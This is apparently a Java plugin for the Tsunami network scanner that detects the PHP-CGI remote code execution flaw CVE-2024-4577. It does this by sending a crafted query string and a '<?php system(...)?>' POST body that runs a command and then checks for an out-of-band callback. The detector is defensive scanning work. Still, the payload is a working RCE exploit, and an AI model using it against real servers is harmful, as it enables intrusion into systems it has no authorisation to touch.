/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve20244577;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.cve20244577.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects highly critical RCE CVE-2024-4577. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-4577 Detector",
    version = "0.1",
    description = "Detects CVE-2024-4577 RCE vulnerability in PHP.",
    author = "Leonardo Tamiano (leonardo.tamiano@mindedsecurity.com)",
    bootstrapModule = Cve20244577DetectorBootstrapModule.class)
public final class Cve20244577Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE_2024-4577";

  @VisibleForTesting static final String VULNERABILITY_REPORT_TITLE = "PHP RCE CVE-2024-4577";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "When using Apache and PHP, with CGI enabled on Windows, if the system is set up to use"
          + " certain code pages (such as the Japanese locale), and if the version of PHP is"
          + " vulnerable (8.3.* before 8.3.8, 8.2.* before 8.2.20, 8.1.* before 8.1.29), Windows"
          + " may use 'Best-Fit' behavior to replace characters in the command line given to Win32"
          + " API functions. PHP CGI module may misinterpret those characters as PHP options, which"
          + " may allow a malicious user to pass options to the PHP binary being run, allowing to"
          + " achieve RCE.";

  @VisibleForTesting
  static final String RECOMMENDATION =
      "Upgrade to non-vulnerable versions of PHP (8.3.8, 8.2.20, 8.1.29), or disable the CGI"
          + " configuration.";

  // Payload used to trigger the vulnerability
  private static final String VULN_ARGS =
      "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  @Inject
  Cve20244577Detector(
      @UtcClock Clock utcClock,
      HttpClient httpClient,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting CVE-2024-4577 RCE detection.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    if (!payloadGenerator.isCallbackServerEnabled()) {
      // callback server is required
      return false;
    }

    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.WINDOWS_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);

    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      // callback server is required
      return false;
    }

    String finalPayload = String.format("<?php system('%s')?>", payload.getPayload());
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULN_ARGS;
    try {
      // blocking call.
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Content-Type", "application/x-www-form-urlencoded")
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(finalPayload))
                  .build());
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
    // Wait to receive callback
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    return payload.checkIfExecuted();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULN_DESCRIPTION)
                .setRecommendation(RECOMMENDATION))
        .build();
  }
}
